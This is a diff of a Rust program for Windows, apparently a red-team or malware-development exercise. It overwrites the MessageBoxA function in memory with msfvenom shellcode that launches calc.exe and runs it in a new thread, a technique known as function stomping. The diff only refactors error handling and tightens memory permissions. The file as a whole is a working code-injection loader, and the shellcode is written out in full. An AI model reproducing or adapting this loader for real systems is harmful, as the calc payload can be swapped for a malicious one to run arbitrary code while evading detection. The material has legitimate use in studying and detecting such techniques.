@@ -1,19 +1,13 @@
-use std::{
-    ffi::c_void,
-    mem::transmute,
-    ptr::copy,
-    ptr::{null, null_mut},
-};
 use windows::{
-    core::s,
+    core::{s, Error, Result},
     Win32::System::{
         LibraryLoader::{GetProcAddress, LoadLibraryA},
-        Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
+        Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
         Threading::{CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS},
     },
 };
 
-fn main() {
+fn main() -> Result<()> {
     // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
     let shellcode: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -37,40 +31,39 @@ fn main() {
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
     unsafe {
-        let h_module = LoadLibraryA(s!("user32")).unwrap_or_else(|e| {
-            panic!("[!] LoadLibraryA Failed With Error: {e}");
-        });
+        let h_module = LoadLibraryA(s!("user32"))?;
 
-        let func = GetProcAddress(h_module, s!("MessageBoxA")).expect("[!] GetProcAddress Failed");
-        let func_ptr = transmute::<_, *mut c_void>(func);
+        let func = GetProcAddress(h_module, s!("MessageBoxA")).ok_or_else(|| Error::from_win32())?
+            as *const u8;
 
         let mut oldprotect = PAGE_PROTECTION_FLAGS(0);
-        VirtualProtect(func_ptr, shellcode.len(), PAGE_READWRITE, &mut oldprotect).unwrap_or_else(|e| {
-            panic!("[!] VirtualProtect (1) Failed With Error: {e}");
-        });
+        VirtualProtect(
+            func.cast(),
+            shellcode.len(),
+            PAGE_READWRITE,
+            &mut oldprotect,
+        )?;
 
-        copy(shellcode.as_ptr(), func_ptr as *mut u8, shellcode.len());
+        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), func.cast_mut(), shellcode.len());
 
         VirtualProtect(
-            func_ptr,
+            func.cast(),
             shellcode.len(),
-            PAGE_EXECUTE_READWRITE,
+            PAGE_EXECUTE_READ,
             &mut oldprotect,
-        ).unwrap_or_else(|e| {
-            panic!("[!] VirtualProtect (2) Failed With Error: {e}");
-        });
+        )?;
 
         let hthread = CreateThread(
-            Some(null()),
+            None,
             0,
-            Some(transmute(func_ptr)),
-            Some(null()),
+            Some(std::mem::transmute(func.cast_mut())),
+            None,
             THREAD_CREATION_FLAGS(0),
-            Some(null_mut()),
-        ).unwrap_or_else(|e| {
-            panic!("[!] CreateThread Failed With Error: {e}");
-        });
+            None,
+        )?;
 
         WaitForSingleObject(hthread, INFINITE);
     }
+
+    Ok(())
 }
